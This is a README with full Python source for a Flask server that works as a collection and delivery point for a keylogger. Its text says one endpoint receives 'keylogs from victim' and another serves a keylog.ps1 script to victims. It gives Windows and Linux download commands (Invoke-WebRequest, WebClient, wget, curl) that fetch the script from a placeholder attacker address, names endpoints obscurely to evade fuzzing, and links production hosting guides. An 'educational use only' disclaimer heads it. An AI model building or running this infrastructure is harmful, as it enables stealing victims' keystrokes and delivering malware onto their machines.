**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Web server with Flask
Simple python script, to launch a web server which takes POST and GET requests.

## How to use:

- Download the file `webhook`
- Edit `app.run(host='IP_YOU_WANT_TO_LISTEN', port=PORT_NUMBER)` , to the IP and Port, you want to listen the incoming traffic.
- Give permission `chmod 700 webhook`
- Run `./webhook`
  
**Profit!**   
Webhook is now running:
- `/c2VydmVy` end point, for example `http://IP_YOU_WANT_TO_LISTEN/c2VydmVy, accepts POST requests, in our project, designed for receiving the keylogs from victim.
- `/c2VydmVy/filename` endpoint takes GET requests, for example if you have `keylog.ps1` script in the same folder where the webhook is executed, you can fetch the script to victim:
	- Windows (2 examples): 
		- `Invoke-WebRequest -Uri http://IP_YOU_WANT_TO_LISTEN/c2VydmVy/keylog.ps1 -OutFile "test.ps1"`
		- `(New-Object System.Net.WebClient).DownloadFile("IP_YOU_WANT_TO_LISTEN/c2VydmVy/logger.ps1", "test.ps1")`
	- Linux (2 examples): 
		- `wget http://IP_YOU_WANT_TO_LISTEN/c2VydmVy/keylog.ps1`
		- `curl http://IP_YOU_WANT_TO_LISTEN/c2VydmVy/logger.ps1 -o test.ps1`
---

### Commented code:

```python
#!/bin/python3
from flask import Flask, request, send_from_directory
import os

app = Flask(__name__)

# Define the working dir to a variable
WORKING_DIR = os.path.dirname(__file__)

# Function to get the next available log number
def get_next_log_number():
    log_number = 1
    while os.path.exists(os.path.join(WORKING_DIR, f'log-{log_number}.txt')):
        log_number += 1
    return log_number

# @app.route('/')
# def handle_root():
#    return "KUCKUU!"

# Handling POST requests to the specific endpoint
# Scrambled to make FUZZing harder
@app.route('/c2VydmVy', methods=['POST'])
def handle_webhook_post():
    # Checking if the request method is POST
    if request.method == 'POST':
        # Getting the data from the request
        data = request.data

        # Check if the data contains Mac-style line endings
        if b'\r' in data:
            # Replace Mac-style line endings with Unix-style line endings
            data = data.replace(b'\r', b'\n')

        # Getting the next available log number
        log_number = get_next_log_number()
        # Generating the log filename based on the log number
        log_filename = f'log-{log_number}.txt'

        # Writing the received data to the log file in the script's directory
        log_filepath = os.path.join(WORKING_DIR, log_filename)
        with open(log_filepath, 'wb') as file:
            file.write(data)

        # Returning a response indicating successful receipt and logging of data
        return f"Webhook data received and logged as {log_filename}", 200
    else:
        # Returning a 501 status code for unsupported methods
        return "Unsupported method", 501

# Handling GET requests to the specific endpoint
# Scrambled to make FUZZing harder
@app.route('/c2VydmVy/<filename>', methods=['GET'])
def download_file(filename):
    try:
        # Using send_from_directory to serve the file from the script's directory
        return send_from_directory(WORKING_DIR, filename, as_attachment=True)
    except FileNotFoundError:
        # Returning a 404 status code if the file is not found
        return "File not found", 404

# Running the Flask app if this script is executed directly
if __name__ == '__main__':
    # Configuring the Flask app to run on a specific host and port
    app.run(host='IP_YOU_WANT_TO_LISTEN', port=PORT_NUMBER)
```


### Deployment to production

Deployment to production have been tested with:   
**Debian 12 - 1 Core - 256mb RAM**

Using the guides below:  

With Nginx and Gunicorn:   
[DigitalOcean - How to serve Flask application with Gunicorn and Nginx](https://www.digitalocean.com/community/tutorials/how-to-serve-flask-applications-with-gunicorn-and-nginx-on-ubuntu-22-04)

With Apache:   
[Tero Karvinen - Deploy Python Flask to Production](https://terokarvinen.com/2020/deploy-python-flask-to-production/)


